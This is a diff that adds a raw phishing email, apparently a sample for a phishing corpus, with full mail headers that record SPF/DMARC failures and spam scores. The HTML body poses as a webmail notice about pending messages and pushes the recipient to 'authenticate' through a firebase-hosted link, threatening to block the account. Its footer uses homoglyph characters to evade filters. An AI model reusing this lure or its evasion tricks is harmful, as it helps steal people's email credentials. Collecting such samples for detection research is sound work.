@@ -1,0 +1,225 @@
+Return-Path: noreply-webmailserver@mail.com
+Delivered-To: jose@monkey.org
+X-FDA: 79201189116.32.DFF8C48
+Received: from florian.hastek.net (florian.hastek.net [54.175.148.34])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id 19E88800B98E
+	for <jose@monkey.org>; Thu,  3 Mar 2022 00:28:36 +0000 (UTC)
+Received: from florian.hastek.net (localhost [127.0.0.1])
+	by florian.hastek.net (Postfix) with ESMTP id C7BEC44CFE
+	for <jose@monkey.org>; Wed,  2 Mar 2022 19:28:36 -0500 (EST)
+Received: by florian.hastek.net (Postfix, from userid 99)
+	id C465D44D12; Wed,  2 Mar 2022 19:28:36 -0500 (EST)
+X-Spam-Checker-Version: SpamAssassin 3.4.2 (2018-09-13) on florian.hastek.net
+X-Spam-Flag: YES
+X-Spam-Level: ****
+X-Spam-Report: 
+	* -1.0 ALL_TRUSTED Passed through trusted hosts only via SMTP
+	* -1.9 BAYES_00 BODY: Bayes spam probability is 0 to 1%
+	*      [score: 0.0000]
+	*  0.0 FREEMAIL_FROM Sender email is commonly abused enduser mail
+	*      provider (noreply-webmailserver[at]mail.com)
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.1 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  0.9 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+	*  1.9 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  3.0 URI_FIREBASEAPP Link to hosted firebase web application,
+	*      possible phishing
+	*  2.0 FSL_BULK_SIG Bulk signature with no Unsubscribe
+X-Spam-DCC: INFN-TO: florian.hastek.net 1233; Body=1 Fuz1=1 Fuz2=1065
+Received: from mail.com (unknown [103.151.122.244])
+	by florian.hastek.net (Postfix) with ESMTPA id 7FF2F46387
+	for <jose@monkey.org>; Thu,  3 Mar 2022 00:15:59 +0000 (UTC)
+Reply-To: jose@monkey.org
+From: Webmail server <noreply-webmailserver@mail.com>
+To: jose@monkey.org
+Subject: ****SPAM(5.0)**** Pending Messages.
+Date: 2 Mar 2022 16:16:02 -0800
+Message-ID: <20220302161602.1517E5948FEB73D3@mail.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Prev-Subject: Pending Messages.
+X-Rspam-User: 
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=none;
+	spf=fail (imf20.b.hostedemail.com: domain of noreply-webmailserver@mail.com does not designate 54.175.148.34 as permitted sender) smtp.mailfrom=noreply-webmailserver@mail.com;
+	dmarc=fail reason="No valid SPF, No valid DKIM" header.from=mail.com (policy=none)
+X-Spam-Status: Yes, score=24.70
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: 19E88800B98E
+X-Stat-Signature: 78n5zii3us1js9rakq4889coyj7e4non
+X-HE-Tag: 1646267316-37712
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 26
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div class=3D"yiv2677192131ydp13da18a9yiv2728580349I_52qC yiv2677192131ydp1=
+3da18a9yiv2728580349D_FY yiv2677192131ydp13da18a9yiv2728580349W_6D6F" style=
+=3D"width: 794px; display: table;">
+<div class=3D"yiv2677192131ydp13da18a9yiv2728580349msg-body yiv2677192131yd=
+p13da18a9yiv2728580349P_wpofO yiv2677192131ydp13da18a9yiv2728580349mq_AS" s=
+tyle=3D"padding: 2px 0px 0px; line-height: normal; font-family: Helvetica, =
+Arial, sans-serif; position: relative;">
+<div class=3D"yiv2677192131ydp13da18a9yiv2728580349jb_0 yiv2677192131ydp13d=
+a18a9yiv2728580349X_6MGW yiv2677192131ydp13da18a9yiv2728580349N_6Fd5" style=
+=3D"padding-right: 16px; padding-bottom: 0px; padding-left: 24px;">
+<div id=3D"yiv2677192131ydp13da18a9yiv2728580349"><br class=3D"Apple-interc=
+hange-newline">
+<table width=3D"100%" style=3D"font-family: Verdana, Arial, Helvetica, sans=
+-serif; font-size: 10px; border-collapse: collapse; max-width: 100%; backgr=
+ound-color: rgb(245, 247, 248);" bgcolor=3D"#f5f7f8" border=3D"0" cellspaci=
+ng=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding-top: 0px; padding-bottom: 0px; -ms-word-break: normal;=
+" bgcolor=3D"#f5f7f8">
+<div style=3D"margin: 0px auto; padding-right: 20px; padding-left: 20px; ma=
+x-width: 600px;">
+<table align=3D"center" style=3D"margin: 0px auto; width: 560px; color: rgb=
+(17, 17, 17); font-family: sans-serif; border-collapse: collapse; max-width=
+: 600px; background-color: transparent;">
+<tbody>
+<tr>
+<td style=3D"padding: 0px; font-family: Verdana, Arial, Helvetica, sans-ser=
+if; -ms-word-break: normal;">
+<table width=3D"100%" style=3D"font-family: sans-serif; border-collapse: co=
+llapse; max-width: 100%; background-color: transparent;">
+<tbody>
+<tr>
+<td style=3D"padding: 40px 40px 20px; width: 560px; -ms-word-break: normal;=
+ background-color: rgb(255, 255, 255);">
+<div style=3D"font-family: Arial, Helvetica, sans-serif; font-size: small;"=
+ dir=3D"ltr"><font color=3D"#222222">&nbsp;</font>
+<div>
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"background: white; =
+color: rgb(34, 34, 34); line-height: normal; margin-bottom: 0pt;"><span sty=
+le=3D"color: rgb(51, 51, 51); font-family: sans-serif; font-size: 9pt;">Dea=
+r jose@monkey.org, </span></p>
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"background: white; =
+color: rgb(34, 34, 34); line-height: normal; margin-bottom: 0pt;"><span sty=
+le=3D"color: rgb(51, 51, 51); font-family: sans-serif; font-size: 9pt;"></s=
+pan>&nbsp;</p>
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"background: white; =
+color: rgb(34, 34, 34); line-height: normal; margin-bottom: 0pt;"><span sty=
+le=3D"color: rgb(51, 51, 51); font-family: sans-serif; font-size: 9pt;">Web=
+mail server is pending some messages.</span></p>
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"background: white; =
+color: rgb(34, 34, 34); line-height: normal; margin-bottom: 0pt;"><span sty=
+le=3D"color: rgb(51, 51, 51); font-family: sans-serif; font-size: 9pt;">Kin=
+dly AUTHENTICATE your jose@monkey.org account below to access on hold messa=
+ges.</span><span style=3D"color: rgb(51, 51, 51); font-family: Arial, sans-=
+serif; font-size: 9pt;">&nbsp;</span></p>
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"background: white; =
+color: rgb(34, 34, 34); line-height: normal; margin-bottom: 0pt;"><span sty=
+le=3D"color: rgb(51, 51, 51); font-family: sans-serif; font-size: 9pt;">Thi=
+s link&nbsp;expires 07/03/2022 3:58:52 a.m.<span>&nbsp;<span>&nbsp;</span><=
+/span>and your&nbsp;Email; &nbsp;jose@monkey.org<span>&nbsp;</span><span>&n=
+bsp;</span>will be blocked<br><br></span></p>
+<table align=3D"left" class=3D"yiv2677192131ydp29e8d27dMsoNormalTable" styl=
+e=3D"color: rgb(34, 34, 34);" border=3D"0" cellspacing=3D"0" cellpadding=3D=
+"0">
+<tbody>
+<tr style=3D"min-height: 22.5pt;">
+<td style=3D"background: rgb(255, 232, 108); padding: 0in; border: 1pt soli=
+d rgb(232, 180, 99); -ms-word-break: normal; min-height: 22.5pt;">
+<div align=3D"center">
+<table width=3D"100%" class=3D"yiv2677192131ydp29e8d27dMsoNormalTable" styl=
+e=3D"width: 244px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"13" style=3D"padding: 0in; width: 9.75pt; -ms-word-break: norm=
+al;">
+<table class=3D"yiv2677192131ydp29e8d27dMsoNormalTable" style=3D"width: 9.7=
+5pt;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding: 0.75pt; -ms-word-break: normal;"></td></tr></tbody></=
+table></td>
+<td style=3D"padding: 0in; -ms-word-break: normal;">
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"line-height: normal=
+; margin-bottom: 0pt;"><b><span style=3D"padding: 0in; border: 1pt windowte=
+xt; color: black; font-family: serif; font-size: 10pt;">
+<a style=3D"color: rgb(25, 106, 212); text-decoration: underline;" href=3D"=
+https://wegozzma.web.app/#jose@monkey.org" target=3D"_blank" rel=3D"nofollo=
+w noopener noreferrer"><span style=3D"color: rgb(0, 0, 204);">AUTHENTICATE =
+ACCOUNT HERE</span></a></span></b><span style=3D"font-family: sans-serif; f=
+ont-size: 12pt;"></span></p></td>
+<td width=3D"13" style=3D"padding: 0in; width: 9.75pt; -ms-word-break: norm=
+al;">
+<table class=3D"yiv2677192131ydp29e8d27dMsoNormalTable" style=3D"width: 9.7=
+5pt;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding: 0.75pt; -ms-word-break: normal;">
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"line-height: normal=
+; margin-bottom: 0pt;"><span style=3D"font-family: serif; font-size: 12pt;"=
+></span>&nbsp;</p></td></tr></tbody></table></td></tr></tbody></table></div=
+></td></tr></tbody></table>
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"background: white; =
+color: rgb(34, 34, 34); line-height: normal; margin-bottom: 0pt;"><span sty=
+le=3D"color: rgb(51, 51, 51); font-family: sans-serif; font-size: 9pt;"><br=
+><br></span></p>
+<p class=3D"yiv2677192131ydp29e8d27dMsoNormal" style=3D"background: white; =
+color: rgb(34, 34, 34); line-height: normal; margin-bottom: 0pt;"><span sty=
+le=3D"color: rgb(51, 51, 51); font-family: sans-serif; font-size: 9pt;"><br=
+></span></p></div></div>
+<div style=3D"color: rgb(38, 40, 42); font-family: HelveticaNeue; font-size=
+: 12px;">&nbsp;</div>
+<hr style=3D"font-family: Verdana; font-size: 14px;">
+
+<div style=3D"color: rgb(153, 153, 153); line-height: 1.5; font-family: Ver=
+dana; font-size: 12px; margin-top: 15px;">Please d&#959;&nbsp;n&#959;t repl=
+y t&#959;&nbsp;this email. Emails sent t&#959; this address will n&#959;t b=
+e answered. C&#959;pyright &copy; 1999-2022&nbsp; &#959;perating C&#959;mpa=
+ny,&nbsp;all rights reserved.</div></td></tr></tbody></table></td></tr></tb=
+ody></table></div></td></tr></tbody></table></div></div></div>
+<div class=3D"yiv2677192131ydp13da18a9yiv2728580349jb_0 yiv2677192131ydp13d=
+a18a9yiv2728580349X_6MGW yiv2677192131ydp13da18a9yiv2728580349N_6Fd5" style=
+=3D"padding-right: 16px; padding-bottom: 0px; padding-left: 24px;"></div></=
+div>
+<div class=3D"yiv2677192131ydp13da18a9yiv2728580349H_7jIs yiv2677192131ydp1=
+3da18a9yiv2728580349D_F yiv2677192131ydp13da18a9yiv2728580349ab_C yiv267719=
+2131ydp13da18a9yiv2728580349Q_69H5 yiv2677192131ydp13da18a9yiv2728580349E_3=
+6RhU" style=3D"min-height: 64px;">
+<div class=3D"yiv2677192131ydp13da18a9yiv2728580349D_F yiv2677192131ydp13da=
+18a9yiv2728580349W_6D6F yiv2677192131ydp13da18a9yiv2728580349r_BN yiv267719=
+2131ydp13da18a9yiv2728580349gl_C" style=3D"width: 822px; cursor: default;">=
+
+<span class=3D"yiv2677192131ydp13da18a9yiv2728580349em_N yiv2677192131ydp13=
+da18a9yiv2728580349en_N" style=3D'text-align: left; color: rgb(29, 34, 40);=
+ text-transform: none; text-indent: 0px; letter-spacing: normal; font-famil=
+y: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 16px; font-st=
+yle: normal; font-weight: 400; word-spacing: 0px; white-space: normal; orph=
+ans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligat=
+ures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;'></span>
+<div class=3D"yiv2677192131ydp13da18a9yiv2728580349D_F yiv2677192131ydp13da=
+18a9yiv2728580349ab_C yiv2677192131ydp13da18a9yiv2728580349en_0 yiv26771921=
+31ydp13da18a9yiv2728580349b_Z14vXdP yiv2677192131ydp13da18a9yiv2728580349e_=
+3mS2U yiv2677192131ydp13da18a9yiv2728580349I_52qC yiv2677192131ydp13da18a9y=
+iv2728580349P_Z1otBpf" style=3D'padding: 5px 4px; border-radius: 100px; bor=
+der: 1px solid rgb(224, 228, 233); text-align: left; color: rgb(29, 34, 40)=
+; text-transform: none; text-indent: 0px;=20
+letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, sa=
+ns-serif; font-size: 16px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;'>
+<ul class=3D"yiv2677192131ydp13da18a9yiv2728580349hd_n yiv2677192131ydp13da=
+18a9yiv2728580349P_0 yiv2677192131ydp13da18a9yiv2728580349H_6D6F yiv2677192=
+131ydp13da18a9yiv2728580349M_0 yiv2677192131ydp13da18a9yiv2728580349ir3_0 y=
+iv2677192131ydp13da18a9yiv2728580349iy_h yiv2677192131ydp13da18a9yiv2728580=
+349D_F yiv2677192131ydp13da18a9yiv2728580349ab_C" style=3D"margin: 0px; pad=
+ding: 0px; list-style-type: none; min-height: 20px;">
+<br class=3D"Apple-interchange-newline"></ul></div></div></div></body></htm=
+l>
+
